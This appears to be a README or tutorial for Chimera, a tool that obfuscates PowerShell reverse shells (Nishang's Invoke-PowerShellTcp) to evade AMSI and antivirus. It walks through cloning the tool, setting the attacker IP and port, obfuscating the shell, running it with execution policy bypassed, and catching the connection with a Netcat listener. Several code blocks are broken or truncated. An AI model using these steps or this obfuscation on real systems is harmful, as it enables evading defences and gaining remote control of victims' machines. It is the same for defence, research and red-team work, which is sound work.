[Chimera](https://github.com/tokyoneon/Chimera) is a PowerShell obfuscation script designed to bypass Microsoft's AMSI as well as commercial antivirus solutions. It digests malicious PowerShell scripts known to trigger antivirus software and uses simple string substitution and variable concatenation to evade common detection signatures.

Below is a snippet of Nishang's [Invoke-PowerShellTcp.ps1](https://github.com/tokyoneon/Chimera/blob/master/shells/Invoke-PowerShellTcp.ps1), found at [nishang/Shells](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). In the below PowerShell terminal, the attacker is downloading Nishang's script ("shell.ps1") which will invoke a connection to a remote server. When attempting to execute PowerShell scripts in this way, AMSI will use signature-based detection to identify malicious activity. VirusTotal reports [25 detections](https://www.virustotal.com/gui/file/0f1e223eaf8b6d71f65960f8b9e14c98ba62e585334a6349bcd02216f4415868/detection) of the PS1 script and AMSI prevents the attack.

```powershell
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

#Send back current username and computername
$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
$stream.Write($sendbytes,0,$sendbytes.Length)

#Show an interactive PowerShell prompt
$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
$stream.Write($sendbytes,0,$sendbytes.Length)
```

And here's the same snippet, after Chimera. An arbitrary message is printed in the terminal as a connection is established to the attacker's server. VirusTotal reports [0 detections](https://www.virustotal.com/gui/file/74a47198fefa10a8ebb88a8b130259e56a5a9fc4302089ac73009742ba5c98dc/detection) of the obfuscated version and AMSI has no issues executing the script.
```powershell

Chimera does several things to obfuscate the source. The [transformer function](https://github.com/tokyoneon/Chimera/blob/master/chimera.sh#L403) will separate strings into multiple pieces and reconstruct them as new variables.

For example, it will take a string like `... New-Object System.Net.Sockets.TCPClient ...` and convert it to:

```powershell
$a = "Syste"
$b = "m.Net.Soc"
$c = "kets.TCP"
$d = "Client"

... New-Object $a$b$c$d ...
```

The function separates commonly flagged data types and strings into several chunks. It defines the chunks and concatenates them at the top of the script. A higher `--level` will result in smaller chunks and more variables.

```powershell
$CNiJfmZzzQrqZzqKqueOBcUVzmkVbllcEqjrbcaYzTMMd = "`m"
$quiyjqGdhQZgYFRdKpDGGyWNlAjvPCxQTTbmFkvTmyB = "t`Rea"
$JKflrRllAqgRlHQIUzOoyOUEqVuVrqqCKdua = "Get`s"
$GdavWoszHwDVJmpYwqEweQsIAz = "ti`ON"
$xcDWTDlvcJfvDZCasdTnWGvMXkRBKOCGEANJpUXDyjPob = "`L`O`Ca"
$zvlOGdEJVsPNBDwfKFWpvFYvlgJXDvIUgTnQ = "`Get`-"
$kvfTogUXUxMfCoxBikPwWgwHrvNOwjoBxxto = "`i"
$tJdNeNXdANBemQKeUjylmlObtYp = "`AsC`i"
$mhtAtRrydLlYBttEnvxuWkAQPTjvtFPwO = "`G"
$PXIuUKzhMNDUYGZKqftvpAiQ = "t`R`iN
```


Review the [README](https://github.com/tokyoneon/Chimera), and [USAGE guide](https://github.com/tokyoneon/Chimera/blob/master/USAGE.md) on GitHub for an in-depth look at how Chimera is used. 
```bash
sudo apt-get update; sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git #depends
sudo git clone https://github.com/tokyoneon/chimera /opt/chimera #clone the repo
sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/ #permissions
sudo chmod +x chimera.sh; ./chimera.sh --help #print help menu
```


In the [shells/](https://github.com/tokyoneon/Chimera/tree/master/shells) directory are several Nishang scripts and a few generic ones. All have been tested and are working. However, there's no telling how untested scripts will reproduce with Chimera. It's recommended to use only the included shells.
```
/opt/chimera$ ls -laR shells/

shells/:

-rwxrwx--- 1 user user 6762 Aug 29 00:27 Invoke-PoshRatHttp.ps1
```

Before using the scripts, change the hardcoded IP addresses (`192.168.56.101`) to your Kali address.
```
/opt/chimera$ sed -i 's/192.168.56.101/<YOUR-IP-ADDRESS>/g' shells/*.ps1
```

The default port with all of the scripts is 4444. Use `sed` again to change them if needed.
```
/opt/chimera$ sed -i 's/4444/<YOUR-DESIRED-PORT>/g' shells/*.ps1
```

Use the following command to obfuscate one of the available scripts with Chimera.
```
/opt/chimera$ ./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -o /tmp/chimera.ps1 -g -v -t -j -i -c -h -s -b -e

In a new terminal, start a Netcat listener to receive incoming connections. Be sure to use `-v` as some of the scripts don't produce a shell prompt when a new connection is established. Move the `/tmp/chimera.ps1` file to a local Windows 10 machine. Then, open a PowerShell terminal and execute the file with the following command.
```powershell
PS> powershell.exe -ep bypass C:\path\to\chimera.ps1
```

Back in Kali, the `nc` terminal will produce the following output — with no complaints from AMSI.
```
~$ nc -v -l -p 4444

listening on [any] 4444 ...
192.168.56.105: inverse host lookup failed: Host name lookup failure
